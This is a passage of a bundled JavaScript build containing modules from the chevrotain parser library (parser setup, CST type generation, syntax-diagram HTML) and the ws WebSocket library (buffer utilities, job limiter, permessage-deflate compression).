    };
  }
});

// node_modules/chevrotain/lib/src/parse/parser/traits/perf_tracer.js
var PerformanceTracer;
var init_perf_tracer = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/traits/perf_tracer.js"() {
    init_lodash();
    init_api();
    init_parser();
    PerformanceTracer = class {
      initPerformanceTracer(config) {
        if (has_default(config, "traceInitPerf")) {
          const userTraceInitPerf = config.traceInitPerf;
          const traceIsNumber = typeof userTraceInitPerf === "number";
          this.traceInitMaxIdent = traceIsNumber ? userTraceInitPerf : Infinity;
          this.traceInitPerf = traceIsNumber ? userTraceInitPerf > 0 : userTraceInitPerf;
        } else {
          this.traceInitMaxIdent = 0;
          this.traceInitPerf = DEFAULT_PARSER_CONFIG.traceInitPerf;
        }
        this.traceInitIndent = -1;
      }
      TRACE_INIT(phaseDesc, phaseImpl) {
        if (this.traceInitPerf === true) {
          this.traceInitIndent++;
          const indent = new Array(this.traceInitIndent + 1).join("	");
          if (this.traceInitIndent < this.traceInitMaxIdent) {
            console.log(`${indent}--> <${phaseDesc}>`);
          }
          const { time, value } = timer(phaseImpl);
          const traceMethod = time > 10 ? console.warn : console.log;
          if (this.traceInitIndent < this.traceInitMaxIdent) {
            traceMethod(`${indent}<-- <${phaseDesc}> time: ${time}ms`);
          }
          this.traceInitIndent--;
          return value;
        } else {
          return phaseImpl();
        }
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/parser/utils/apply_mixins.js
function applyMixins(derivedCtor, baseCtors) {
  baseCtors.forEach((baseCtor) => {
    const baseProto = baseCtor.prototype;
    Object.getOwnPropertyNames(baseProto).forEach((propName) => {
      if (propName === "constructor") {
        return;
      }
      const basePropDescriptor = Object.getOwnPropertyDescriptor(baseProto, propName);
      if (basePropDescriptor && (basePropDescriptor.get || basePropDescriptor.set)) {
        Object.defineProperty(derivedCtor.prototype, propName, basePropDescriptor);
      } else {
        derivedCtor.prototype[propName] = baseCtor.prototype[propName];
      }
    });
  });
}
var init_apply_mixins = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/utils/apply_mixins.js"() {
  }
});

// node_modules/chevrotain/lib/src/parse/parser/parser.js
function EMPTY_ALT(value = void 0) {
  return function() {
    return value;
  };
}
var END_OF_FILE, DEFAULT_PARSER_CONFIG, DEFAULT_RULE_CONFIG, ParserDefinitionErrorType, Parser, CstParser, EmbeddedActionsParser2;
var init_parser = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/parser.js"() {
    init_lodash();
    init_api();
    init_follow();
    init_tokens_public();
    init_errors_public();
    init_gast_resolver_public();
    init_recoverable();
    init_looksahead();
    init_tree_builder();
    init_lexer_adapter();
    init_recognizer_api();
    init_recognizer_engine();
    init_error_handler();
    init_context_assist();
    init_gast_recorder();
    init_perf_tracer();
    init_apply_mixins();
    init_checks();
    END_OF_FILE = createTokenInstance(EOF, "", NaN, NaN, NaN, NaN, NaN, NaN);
    Object.freeze(END_OF_FILE);
    DEFAULT_PARSER_CONFIG = Object.freeze({
      recoveryEnabled: false,
      maxLookahead: 3,
      dynamicTokensEnabled: false,
      outputCst: true,
      errorMessageProvider: defaultParserErrorProvider,
      nodeLocationTracking: "none",
      traceInitPerf: false,
      skipValidations: false
    });
    DEFAULT_RULE_CONFIG = Object.freeze({
      recoveryValueFunc: () => void 0,
      resyncEnabled: true
    });
    (function(ParserDefinitionErrorType2) {
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["INVALID_RULE_NAME"] = 0] = "INVALID_RULE_NAME";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["DUPLICATE_RULE_NAME"] = 1] = "DUPLICATE_RULE_NAME";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["INVALID_RULE_OVERRIDE"] = 2] = "INVALID_RULE_OVERRIDE";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["DUPLICATE_PRODUCTIONS"] = 3] = "DUPLICATE_PRODUCTIONS";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["UNRESOLVED_SUBRULE_REF"] = 4] = "UNRESOLVED_SUBRULE_REF";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["LEFT_RECURSION"] = 5] = "LEFT_RECURSION";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["NONE_LAST_EMPTY_ALT"] = 6] = "NONE_LAST_EMPTY_ALT";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["AMBIGUOUS_ALTS"] = 7] = "AMBIGUOUS_ALTS";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["CONFLICT_TOKENS_RULES_NAMESPACE"] = 8] = "CONFLICT_TOKENS_RULES_NAMESPACE";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["INVALID_TOKEN_NAME"] = 9] = "INVALID_TOKEN_NAME";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["NO_NON_EMPTY_LOOKAHEAD"] = 10] = "NO_NON_EMPTY_LOOKAHEAD";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["AMBIGUOUS_PREFIX_ALTS"] = 11] = "AMBIGUOUS_PREFIX_ALTS";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["TOO_MANY_ALTS"] = 12] = "TOO_MANY_ALTS";
      ParserDefinitionErrorType2[ParserDefinitionErrorType2["CUSTOM_LOOKAHEAD_VALIDATION"] = 13] = "CUSTOM_LOOKAHEAD_VALIDATION";
    })(ParserDefinitionErrorType || (ParserDefinitionErrorType = {}));
    Parser = class _Parser {
      /**
       *  @deprecated use the **instance** method with the same name instead
       */
      static performSelfAnalysis(parserInstance) {
        throw Error("The **static** `performSelfAnalysis` method has been deprecated.	\nUse the **instance** method with the same name instead.");
      }
      performSelfAnalysis() {
        this.TRACE_INIT("performSelfAnalysis", () => {
          let defErrorsMsgs;
          this.selfAnalysisDone = true;
          const className = this.className;
          this.TRACE_INIT("toFastProps", () => {
            toFastProperties(this);
          });
          this.TRACE_INIT("Grammar Recording", () => {
            try {
              this.enableRecording();
              forEach_default(this.definedRulesNames, (currRuleName) => {
                const wrappedRule = this[currRuleName];
                const originalGrammarAction = wrappedRule["originalGrammarAction"];
                let recordedRuleGast;
                this.TRACE_INIT(`${currRuleName} Rule`, () => {
                  recordedRuleGast = this.topLevelRuleRecord(currRuleName, originalGrammarAction);
                });
                this.gastProductionsCache[currRuleName] = recordedRuleGast;
              });
            } finally {
              this.disableRecording();
            }
          });
          let resolverErrors = [];
          this.TRACE_INIT("Grammar Resolving", () => {
            resolverErrors = resolveGrammar2({
              rules: values_default(this.gastProductionsCache)
            });
            this.definitionErrors = this.definitionErrors.concat(resolverErrors);
          });
          this.TRACE_INIT("Grammar Validations", () => {
            if (isEmpty_default(resolverErrors) && this.skipValidations === false) {
              const validationErrors = validateGrammar2({
                rules: values_default(this.gastProductionsCache),
                tokenTypes: values_default(this.tokensMap),
                errMsgProvider: defaultGrammarValidatorErrorProvider,
                grammarName: className
              });
              const lookaheadValidationErrors = validateLookahead({
                lookaheadStrategy: this.lookaheadStrategy,
                rules: values_default(this.gastProductionsCache),
                tokenTypes: values_default(this.tokensMap),
                grammarName: className
              });
              this.definitionErrors = this.definitionErrors.concat(validationErrors, lookaheadValidationErrors);
            }
          });
          if (isEmpty_default(this.definitionErrors)) {
            if (this.recoveryEnabled) {
              this.TRACE_INIT("computeAllProdsFollows", () => {
                const allFollows = computeAllProdsFollows(values_default(this.gastProductionsCache));
                this.resyncFollows = allFollows;
              });
            }
            this.TRACE_INIT("ComputeLookaheadFunctions", () => {
              var _a, _b;
              (_b = (_a = this.lookaheadStrategy).initialize) === null || _b === void 0 ? void 0 : _b.call(_a, {
                rules: values_default(this.gastProductionsCache)
              });
              this.preComputeLookaheadFunctions(values_default(this.gastProductionsCache));
            });
          }
          if (!_Parser.DEFER_DEFINITION_ERRORS_HANDLING && !isEmpty_default(this.definitionErrors)) {
            defErrorsMsgs = map_default(this.definitionErrors, (defError) => defError.message);
            throw new Error(`Parser Definition Errors detected:
 ${defErrorsMsgs.join("\n-------------------------------\n")}`);
          }
        });
      }
      constructor(tokenVocabulary, config) {
        this.definitionErrors = [];
        this.selfAnalysisDone = false;
        const that = this;
        that.initErrorHandler(config);
        that.initLexerAdapter();
        that.initLooksAhead(config);
        that.initRecognizerEngine(tokenVocabulary, config);
        that.initRecoverable(config);
        that.initTreeBuilder(config);
        that.initContentAssist();
        that.initGastRecorder(config);
        that.initPerformanceTracer(config);
        if (has_default(config, "ignoredIssues")) {
          throw new Error("The <ignoredIssues> IParserConfig property has been deprecated.\n	Please use the <IGNORE_AMBIGUITIES> flag on the relevant DSL method instead.\n	See: https://chevrotain.io/docs/guide/resolving_grammar_errors.html#IGNORING_AMBIGUITIES\n	For further details.");
        }
        this.skipValidations = has_default(config, "skipValidations") ? config.skipValidations : DEFAULT_PARSER_CONFIG.skipValidations;
      }
    };
    Parser.DEFER_DEFINITION_ERRORS_HANDLING = false;
    applyMixins(Parser, [
      Recoverable,
      LooksAhead,
      TreeBuilder,
      LexerAdapter,
      RecognizerEngine,
      RecognizerApi,
      ErrorHandler,
      ContentAssist,
      GastRecorder,
      PerformanceTracer
    ]);
    CstParser = class extends Parser {
      constructor(tokenVocabulary, config = DEFAULT_PARSER_CONFIG) {
        const configClone = clone_default(config);
        configClone.outputCst = true;
        super(tokenVocabulary, configClone);
      }
    };
    EmbeddedActionsParser2 = class extends Parser {
      constructor(tokenVocabulary, config = DEFAULT_PARSER_CONFIG) {
        const configClone = clone_default(config);
        configClone.outputCst = false;
        super(tokenVocabulary, configClone);
      }
    };
  }
});

// node_modules/@chevrotain/cst-dts-gen/lib/src/model.js
function buildModel(productions) {
  const generator = new CstNodeDefinitionGenerator();
  const allRules = values_default(productions);
  return map_default(allRules, (rule) => generator.visitRule(rule));
}
function getType(production) {
  if (production instanceof NonTerminal) {
    return {
      kind: "rule",
      name: production.referencedRule.name
    };
  }
  return { kind: "token" };
}
var CstNodeDefinitionGenerator;
var init_model2 = __esm({
  "node_modules/@chevrotain/cst-dts-gen/lib/src/model.js"() {
    init_api2();
    init_lodash();
    CstNodeDefinitionGenerator = class extends GAstVisitor {
      visitRule(node) {
        const rawElements = this.visitEach(node.definition);
        const grouped = groupBy_default(rawElements, (el) => el.propertyName);
        const properties = map_default(grouped, (group, propertyName) => {
          const allNullable = !some_default(group, (el) => !el.canBeNull);
          let propertyType = group[0].type;
          if (group.length > 1) {
            propertyType = map_default(group, (g) => g.type);
          }
          return {
            name: propertyName,
            type: propertyType,
            optional: allNullable
          };
        });
        return {
          name: node.name,
          properties
        };
      }
      visitAlternative(node) {
        return this.visitEachAndOverrideWith(node.definition, { canBeNull: true });
      }
      visitOption(node) {
        return this.visitEachAndOverrideWith(node.definition, { canBeNull: true });
      }
      visitRepetition(node) {
        return this.visitEachAndOverrideWith(node.definition, { canBeNull: true });
      }
      visitRepetitionMandatory(node) {
        return this.visitEach(node.definition);
      }
      visitRepetitionMandatoryWithSeparator(node) {
        return this.visitEach(node.definition).concat({
          propertyName: node.separator.name,
          canBeNull: true,
          type: getType(node.separator)
        });
      }
      visitRepetitionWithSeparator(node) {
        return this.visitEachAndOverrideWith(node.definition, {
          canBeNull: true
        }).concat({
          propertyName: node.separator.name,
          canBeNull: true,
          type: getType(node.separator)
        });
      }
      visitAlternation(node) {
        return this.visitEachAndOverrideWith(node.definition, { canBeNull: true });
      }
      visitTerminal(node) {
        return [
          {
            propertyName: node.label || node.terminalType.name,
            canBeNull: false,
            type: getType(node)
          }
        ];
      }
      visitNonTerminal(node) {
        return [
          {
            propertyName: node.label || node.nonTerminalName,
            canBeNull: false,
            type: getType(node)
          }
        ];
      }
      visitEachAndOverrideWith(definition, override) {
        return map_default(this.visitEach(definition), (definition2) => assign_default({}, definition2, override));
      }
      visitEach(definition) {
        return flatten_default(map_default(definition, (definition2) => this.visit(definition2)));
      }
    };
  }
});

// node_modules/@chevrotain/cst-dts-gen/lib/src/generate.js
function genDts(model, options) {
  let contentParts = [];
  contentParts = contentParts.concat(`import type { CstNode, ICstVisitor, IToken } from "chevrotain";`);
  contentParts = contentParts.concat(flatten_default(map_default(model, (node) => genCstNodeTypes(node))));
  if (options.includeVisitorInterface) {
    contentParts = contentParts.concat(genVisitor(options.visitorInterfaceName, model));
  }
  return contentParts.join("\n\n") + "\n";
}
function genCstNodeTypes(node) {
  const nodeCstInterface = genNodeInterface(node);
  const nodeChildrenInterface = genNodeChildrenType(node);
  return [nodeCstInterface, nodeChildrenInterface];
}
function genNodeInterface(node) {
  const nodeInterfaceName = getNodeInterfaceName(node.name);
  const childrenTypeName = getNodeChildrenTypeName(node.name);
  return `export interface ${nodeInterfaceName} extends CstNode {
  name: "${node.name}";
  children: ${childrenTypeName};
}`;
}
function genNodeChildrenType(node) {
  const typeName = getNodeChildrenTypeName(node.name);
  return `export type ${typeName} = {
  ${map_default(node.properties, (property2) => genChildProperty(property2)).join("\n  ")}
};`;
}
function genChildProperty(prop) {
  const typeName = buildTypeString(prop.type);
  return `${prop.name}${prop.optional ? "?" : ""}: ${typeName}[];`;
}
function genVisitor(name, nodes) {
  return `export interface ${name}<IN, OUT> extends ICstVisitor<IN, OUT> {
  ${map_default(nodes, (node) => genVisitorFunction(node)).join("\n  ")}
}`;
}
function genVisitorFunction(node) {
  const childrenTypeName = getNodeChildrenTypeName(node.name);
  return `${node.name}(children: ${childrenTypeName}, param?: IN): OUT;`;
}
function buildTypeString(type) {
  if (isArray_default(type)) {
    const typeNames = uniq_default(map_default(type, (t) => getTypeString(t)));
    const typeString = reduce_default(typeNames, (sum, t) => sum + " | " + t);
    return "(" + typeString + ")";
  } else {
    return getTypeString(type);
  }
}
function getTypeString(type) {
  if (type.kind === "token") {
    return "IToken";
  }
  return getNodeInterfaceName(type.name);
}
function getNodeInterfaceName(ruleName) {
  return upperFirst_default(ruleName) + "CstNode";
}
function getNodeChildrenTypeName(ruleName) {
  return upperFirst_default(ruleName) + "CstChildren";
}
var init_generate = __esm({
  "node_modules/@chevrotain/cst-dts-gen/lib/src/generate.js"() {
    init_lodash();
  }
});

// node_modules/@chevrotain/cst-dts-gen/lib/src/api.js
function generateCstDts(productions, options) {
  const effectiveOptions = Object.assign(Object.assign({}, defaultOptions), options);
  const model = buildModel(productions);
  return genDts(model, effectiveOptions);
}
var defaultOptions;
var init_api4 = __esm({
  "node_modules/@chevrotain/cst-dts-gen/lib/src/api.js"() {
    init_model2();
    init_generate();
    defaultOptions = {
      includeVisitorInterface: true,
      visitorInterfaceName: "ICstNodeVisitor"
    };
  }
});

// node_modules/chevrotain/lib/src/diagrams/render_public.js
function createSyntaxDiagramsCode(grammar, { resourceBase = `https://unpkg.com/chevrotain@${VERSION}/diagrams/`, css = `https://unpkg.com/chevrotain@${VERSION}/diagrams/diagrams.css` } = {}) {
  const header = `
<!-- This is a generated file -->
<!DOCTYPE html>
<meta charset="utf-8">
<style>
  body {
    background-color: hsl(30, 20%, 95%)
  }
</style>

`;
  const cssHtml = `
<link rel='stylesheet' href='${css}'>
`;
  const scripts = `
<script src='${resourceBase}vendor/railroad-diagrams.js'></script>
<script src='${resourceBase}src/diagrams_builder.js'></script>
<script src='${resourceBase}src/diagrams_behavior.js'></script>
<script src='${resourceBase}src/main.js'></script>
`;
  const diagramsDiv = `
<div id="diagrams" align="center"></div>    
`;
  const serializedGrammar = `
<script>
    window.serializedGrammar = ${JSON.stringify(grammar, null, "  ")};
</script>
`;
  const initLogic = `
<script>
    var diagramsDiv = document.getElementById("diagrams");
    main.drawDiagramsFromSerializedGrammar(serializedGrammar, diagramsDiv);
</script>
`;
  return header + cssHtml + scripts + diagramsDiv + serializedGrammar + initLogic;
}
var init_render_public = __esm({
  "node_modules/chevrotain/lib/src/diagrams/render_public.js"() {
    init_version();
  }
});

// node_modules/chevrotain/lib/src/api.js
var api_exports = {};
__export(api_exports, {
  Alternation: () => Alternation,
  Alternative: () => Alternative,
  CstParser: () => CstParser,
  EMPTY_ALT: () => EMPTY_ALT,
  EOF: () => EOF,
  EarlyExitException: () => EarlyExitException,
  EmbeddedActionsParser: () => EmbeddedActionsParser2,
  GAstVisitor: () => GAstVisitor,
  LLkLookaheadStrategy: () => LLkLookaheadStrategy,
  Lexer: () => Lexer2,
  LexerDefinitionErrorType: () => LexerDefinitionErrorType,
  MismatchedTokenException: () => MismatchedTokenException,
  NoViableAltException: () => NoViableAltException,
  NonTerminal: () => NonTerminal,
  NotAllInputParsedException: () => NotAllInputParsedException,
  Option: () => Option,
  Parser: () => Parser2,
  ParserDefinitionErrorType: () => ParserDefinitionErrorType,
  Repetition: () => Repetition,
  RepetitionMandatory: () => RepetitionMandatory,
  RepetitionMandatoryWithSeparator: () => RepetitionMandatoryWithSeparator,
  RepetitionWithSeparator: () => RepetitionWithSeparator,
  Rule: () => Rule,
  Terminal: () => Terminal,
  VERSION: () => VERSION,
  clearCache: () => clearCache,
  createSyntaxDiagramsCode: () => createSyntaxDiagramsCode,
  createToken: () => createToken2,
  createTokenInstance: () => createTokenInstance,
  defaultLexerErrorProvider: () => defaultLexerErrorProvider,
  defaultParserErrorProvider: () => defaultParserErrorProvider,
  generateCstDts: () => generateCstDts,
  getLookaheadPaths: () => getLookaheadPaths,
  isRecognitionException: () => isRecognitionException,
  serializeGrammar: () => serializeGrammar,
  serializeProduction: () => serializeProduction,
  tokenLabel: () => tokenLabel2,
  tokenMatcher: () => tokenMatcher,
  tokenName: () => tokenName
});
function clearCache() {
  console.warn("The clearCache function was 'soft' removed from the Chevrotain API.\n	 It performs no action other than printing this message.\n	 Please avoid using it as it will be completely removed in the future");
}
var Parser2;
var init_api5 = __esm({
  "node_modules/chevrotain/lib/src/api.js"() {
    init_version();
    init_parser();
    init_lexer_public();
    init_tokens_public();
    init_lookahead();
    init_llk_lookahead();
    init_errors_public();
    init_exceptions_public();
    init_lexer_errors_public();
    init_api2();
    init_api2();
    init_api4();
    init_render_public();
    Parser2 = class {
      constructor() {
        throw new Error("The Parser class has been deprecated, use CstParser or EmbeddedActionsParser instead.	\nSee: https://chevrotain.io/docs/changes/BREAKING_CHANGES.html#_7-0-0");
      }
    };
  }
});

// node_modules/ws/lib/constants.js
var require_constants = __commonJS({
  "node_modules/ws/lib/constants.js"(exports2, module2) {
    "use strict";
    var BINARY_TYPES = ["nodebuffer", "arraybuffer", "fragments"];
    var hasBlob = typeof Blob !== "undefined";
    if (hasBlob) BINARY_TYPES.push("blob");
    module2.exports = {
      BINARY_TYPES,
      CLOSE_TIMEOUT: 3e4,
      EMPTY_BUFFER: Buffer.alloc(0),
      GUID: "258EAFA5-E914-47DA-95CA-C5AB0DC85B11",
      hasBlob,
      kForOnEventAttribute: /* @__PURE__ */ Symbol("kIsForOnEventAttribute"),
      kListener: /* @__PURE__ */ Symbol("kListener"),
      kStatusCode: /* @__PURE__ */ Symbol("status-code"),
      kWebSocket: /* @__PURE__ */ Symbol("websocket"),
      NOOP: () => {
      }
    };
  }
});

// node_modules/ws/lib/buffer-util.js
var require_buffer_util = __commonJS({
  "node_modules/ws/lib/buffer-util.js"(exports2, module2) {
    "use strict";
    var { EMPTY_BUFFER } = require_constants();
    var FastBuffer = Buffer[Symbol.species];
    function concat(list, totalLength) {
      if (list.length === 0) return EMPTY_BUFFER;
      if (list.length === 1) return list[0];
      const target = Buffer.allocUnsafe(totalLength);
      let offset = 0;
      for (let i = 0; i < list.length; i++) {
        const buf = list[i];
        target.set(buf, offset);
        offset += buf.length;
      }
      if (offset < totalLength) {
        return new FastBuffer(target.buffer, target.byteOffset, offset);
      }
      return target;
    }
    function _mask(source, mask, output, offset, length) {
      for (let i = 0; i < length; i++) {
        output[offset + i] = source[i] ^ mask[i & 3];
      }
    }
    function _unmask(buffer, mask) {
      for (let i = 0; i < buffer.length; i++) {
        buffer[i] ^= mask[i & 3];
      }
    }
    function toArrayBuffer(buf) {
      if (buf.length === buf.buffer.byteLength) {
        return buf.buffer;
      }
      return buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.length);
    }
    function toBuffer(data) {
      toBuffer.readOnly = true;
      if (Buffer.isBuffer(data)) return data;
      let buf;
      if (data instanceof ArrayBuffer) {
        buf = new FastBuffer(data);
      } else if (ArrayBuffer.isView(data)) {
        buf = new FastBuffer(data.buffer, data.byteOffset, data.byteLength);
      } else {
        buf = Buffer.from(data);
        toBuffer.readOnly = false;
      }
      return buf;
    }
    module2.exports = {
      concat,
      mask: _mask,
      toArrayBuffer,
      toBuffer,
      unmask: _unmask
    };
    if (!process.env.WS_NO_BUFFER_UTIL) {
      try {
        const bufferUtil = require("bufferutil");
        module2.exports.mask = function(source, mask, output, offset, length) {
          if (length < 48) _mask(source, mask, output, offset, length);
          else bufferUtil.mask(source, mask, output, offset, length);
        };
        module2.exports.unmask = function(buffer, mask) {
          if (buffer.length < 32) _unmask(buffer, mask);
          else bufferUtil.unmask(buffer, mask);
        };
      } catch (e) {
      }
    }
  }
});

// node_modules/ws/lib/limiter.js
var require_limiter = __commonJS({
  "node_modules/ws/lib/limiter.js"(exports2, module2) {
    "use strict";
    var kDone = /* @__PURE__ */ Symbol("kDone");
    var kRun = /* @__PURE__ */ Symbol("kRun");
    var Limiter = class {
      /**
       * Creates a new `Limiter`.
       *
       * @param {Number} [concurrency=Infinity] The maximum number of jobs allowed
       *     to run concurrently
       */
      constructor(concurrency) {
        this[kDone] = () => {
          this.pending--;
          this[kRun]();
        };
        this.concurrency = concurrency || Infinity;
        this.jobs = [];
        this.pending = 0;
      }
      /**
       * Adds a job to the queue.
       *
       * @param {Function} job The job to run
       * @public
       */
      add(job) {
        this.jobs.push(job);
        this[kRun]();
      }
      /**
       * Removes a job from the queue and runs it if possible.
       *
       * @private
       */
      [kRun]() {
        if (this.pending === this.concurrency) return;
        if (this.jobs.length) {
          const job = this.jobs.shift();
          this.pending++;
          job(this[kDone]);
        }
      }
    };
    module2.exports = Limiter;
  }
});

// node_modules/ws/lib/permessage-deflate.js
var require_permessage_deflate = __commonJS({
  "node_modules/ws/lib/permessage-deflate.js"(exports2, module2) {
    "use strict";
    var zlib = require("zlib");
    var bufferUtil = require_buffer_util();
    var Limiter = require_limiter();
    var { kStatusCode } = require_constants();
    var FastBuffer = Buffer[Symbol.species];
    var TRAILER = Buffer.from([0, 0, 255, 255]);
    var kPerMessageDeflate = /* @__PURE__ */ Symbol("permessage-deflate");
    var kTotalLength = /* @__PURE__ */ Symbol("total-length");
    var kCallback = /* @__PURE__ */ Symbol("callback");
    var kBuffers = /* @__PURE__ */ Symbol("buffers");
    var kError = /* @__PURE__ */ Symbol("error");
    var zlibLimiter;
    var PerMessageDeflate = class {
      /**
       * Creates a PerMessageDeflate instance.
       *
       * @param {Object} [options] Configuration options
       * @param {(Boolean|Number)} [options.clientMaxWindowBits] Advertise support
       *     for, or request, a custom client window size
       * @param {Boolean} [options.clientNoContextTakeover=false] Advertise/
       *     acknowledge disabling of client context takeover
       * @param {Number} [options.concurrencyLimit=10] The number of concurrent
       *     calls to zlib
       * @param {(Boolean|Number)} [options.serverMaxWindowBits] Request/confirm the
       *     use of a custom server window size
       * @param {Boolean} [options.serverNoContextTakeover=false] Request/accept
       *     disabling of server context takeover
       * @param {Number} [options.threshold=1024] Size (in bytes) below which
       *     messages should not be compressed if context takeover is disabled
       * @param {Object} [options.zlibDeflateOptions] Options to pass to zlib on
       *     deflate
       * @param {Object} [options.zlibInflateOptions] Options to pass to zlib on
       *     inflate
       * @param {Boolean} [isServer=false] Create the instance in either server or
       *     client mode
       * @param {Number} [maxPayload=0] The maximum allowed message length
       */
      constructor(options, isServer, maxPayload) {
        this._maxPayload = maxPayload | 0;
        this._options = options || {};
        this._threshold = this._options.threshold !== void 0 ? this._options.threshold : 1024;
        this._isServer = !!isServer;
        this._deflate = null;
        this._inflate = null;
        this.params = null;
        if (!zlibLimiter) {
          const concurrency = this._options.concurrencyLimit !== void 0 ? this._options.concurrencyLimit : 10;
          zlibLimiter = new Limiter(concurrency);
        }
      }
      /**
       * @type {String}
       */
      static get extensionName() {
        return "permessage-deflate";
      }
      /**
       * Create an extension negotiation offer.
       *
       * @return {Object} Extension parameters
       * @public
       */
      offer() {
        const params = {};
        if (this._options.serverNoContextTakeover) {
          params.server_no_context_takeover = true;
        }
        if (this._options.clientNoContextTakeover) {
          params.client_no_context_takeover = true;
        }
        if (this._options.serverMaxWindowBits) {
          params.server_max_window_bits = this._options.serverMaxWindowBits;
        }
        if (this._options.clientMaxWindowBits) {
          params.client_max_window_bits = this._options.clientMaxWindowBits;
        } else if (this._options.clientMaxWindowBits == null) {
          params.client_max_window_bits = true;
        }
        return params;
      }
      /**
       * Accept an extension negotiation offer/response.
       *
       * @param {Array} configurations The extension negotiation offers/reponse
       * @return {Object} Accepted configuration
       * @public
       */
      accept(configurations) {
        configurations = this.normalizeParams(configurations);
        this.params = this._isServer ? this.acceptAsServer(configurations) : this.acceptAsClient(configurations);
        return this.params;
      }
      /**
       * Releases all resources used by the extension.
       *
       * @public
       */
      cleanup() {
        if (this._inflate) {
          this._inflate.close();
          this._inflate = null;
        }
        if (this._deflate) {
          const callback = this._deflate[kCallback];
          this._deflate.close();
          this._deflate = null;
          if (callback) {
            callback(
              new Error(
                "The deflate stream was closed while data was being processed"
              )
            );
          }
        }
      }
      /**
       *  Accept an extension negotiation offer.
       *
       * @param {Array} offers The extension negotiation offers
       * @return {Object} Accepted configuration
       * @private
       */
      acceptAsServer(offers) {
        const opts = this._options;
        const accepted = offers.find((params) => {
          if (opts.serverNoContextTakeover === false && params.server_no_context_takeover || params.server_max_window_bits && (opts.serverMaxWindowBits === false || typeof opts.serverMaxWindowBits === "number" && opts.serverMaxWindowBits > params.server_max_window_bits) || typeof opts.clientMaxWindowBits === "number" && !params.client_max_window_bits) {
            return false;
          }
          return true;
        });
        if (!accepted) {
          throw new Error("None of the extension offers can be accepted");
        }
        if (opts.serverNoContextTakeover) {
          accepted.server_no_context_takeover = true;
        }
        if (opts.clientNoContextTakeover) {
          accepted.client_no_context_takeover = true;
        }
        if (typeof opts.serverMaxWindowBits === "number") {
          accepted.server_max_window_bits = opts.serverMaxWindowBits;
        }
        if (typeof opts.clientMaxWindowBits === "number") {
          accepted.client_max_window_bits = opts.clientMaxWindowBits;
        } else if (accepted.client_max_window_bits === true || opts.clientMaxWindowBits === false) {
          delete accepted.client_max_window_bits;
        }
        return accepted;
      }
      /**
       * Accept the extension negotiation response.
       *
       * @param {Array} response The extension negotiation response
       * @return {Object} Accepted configuration
       * @private
       */
      acceptAsClient(response) {
        const params = response[0];
        if (this._options.clientNoContextTakeover === false && params.client_no_context_takeover) {
          throw new Error('Unexpected parameter "client_no_context_takeover"');
        }
        if (!params.client_max_window_bits) {
          if (typeof this._options.clientMaxWindowBits === "number") {
            params.client_max_window_bits = this._options.clientMaxWindowBits;
          }
        } else if (this._options.clientMaxWindowBits === false || typeof this._options.clientMaxWindowBits === "number" && params.client_max_window_bits > this._options.clientMaxWindowBits) {
          throw new Error(
            'Unexpected or invalid parameter "client_max_window_bits"'
          );
        }
        return params;
      }
      /**
       * Normalize parameters.
       *
       * @param {Array} configurations The extension negotiation offers/reponse
       * @return {Array} The offers/response with normalized parameters
       * @private
       */
      normalizeParams(configurations) {
        configurations.forEach((params) => {
          Object.keys(params).forEach((key) => {
            let value = params[key];
            if (value.length > 1) {
              throw new Error(`Parameter "${key}" must have only a single value`);
            }
            value = value[0];
            if (key === "client_max_window_bits") {
              if (value !== true) {
                const num = +value;
                if (!Number.isInteger(num) || num < 8 || num > 15) {
                  throw new TypeError(
                    `Invalid value for parameter "${key}": ${value}`
                  );
                }
                value = num;
              } else if (!this._isServer) {
                throw new TypeError(
                  `Invalid value for parameter "${key}": ${value}`
                );
              }
            } else if (key === "server_max_window_bits") {
              const num = +value;
              if (!Number.isInteger(num) || num < 8 || num > 15) {
                throw new TypeError(
                  `Invalid value for parameter "${key}": ${value}`
                );
              }
              value = num;
            } else if (key === "client_no_context_takeover" || key === "server_no_context_takeover") {
              if (value !== true) {
                throw new TypeError(
                  `Invalid value for parameter "${key}": ${value}`
                );
              }
            } else {
              throw new Error(`Unknown parameter "${key}"`);
            }
            params[key] = value;
          });
        });
        return configurations;
      }
      /**
       * Decompress data. Concurrency limited.
       *
       * @param {Buffer} data Compressed data
       * @param {Boolean} fin Specifies whether or not this is the last fragment
       * @param {Function} callback Callback
       * @public
       */
      decompress(data, fin, callback) {
        zlibLimiter.add((done) => {
          this._decompress(data, fin, (err, result) => {
            done();
            callback(err, result);
          });
        });
      }
      /**
       * Compress data. Concurrency limited.
       *
       * @param {(Buffer|String)} data Data to compress
       * @param {Boolean} fin Specifies whether or not this is the last fragment
       * @param {Function} callback Callback
       * @public
       */
      compress(data, fin, callback) {
        zlibLimiter.add((done) => {
          this._compress(data, fin, (err, result) => {
            done();
            callback(err, result);
          });
        });
      }
      /**
       * Decompress data.
       *
       * @param {Buffer} data Compressed data
       * @param {Boolean} fin Specifies whether or not this is the last fragment
       * @param {Function} callback Callback
       * @private
       */
      _decompress(data, fin, callback) {
        const endpoint = this._isServer ? "client" : "server";
        if (!this._inflate) {
          const key = `${endpoint}_max_window_bits`;
          const windowBits = typeof this.params[key] !== "number" ? zlib.Z_DEFAULT_WINDOWBITS : this.params[key];
          this._inflate = zlib.createInflateRaw({
            ...this._options.zlibInflateOptions,
            windowBits
          });
          this._inflate[kPerMessageDeflate] = this;
          this._inflate[kTotalLength] = 0;
          this._inflate[kBuffers] = [];
          this._inflate.on("error", inflateOnError);
          this._inflate.on("data", inflateOnData);
        }
        this._inflate[kCallback] = callback;
        this._inflate.write(data);
        if (fin) this._inflate.write(TRAILER);
        this._inflate.flush(() => {
          const err = this._inflate[kError];
          if (err) {
            this._inflate.close();
            this._inflate = null;
